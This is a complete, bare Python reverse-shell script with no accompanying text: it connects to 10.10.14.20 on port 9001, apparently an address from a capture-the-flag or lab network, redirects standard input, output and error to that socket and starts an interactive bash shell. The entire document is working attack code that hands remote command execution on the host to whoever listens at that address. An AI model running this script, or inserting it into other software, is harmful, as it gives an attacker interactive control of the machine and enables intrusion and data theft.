import socket, subprocess as sp, os
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect(("10.10.14.20", 9001))   
for fd in range(3):
    os.dup2(conn.fileno(), fd)
sp.call(["/bin/bash", "-i"])
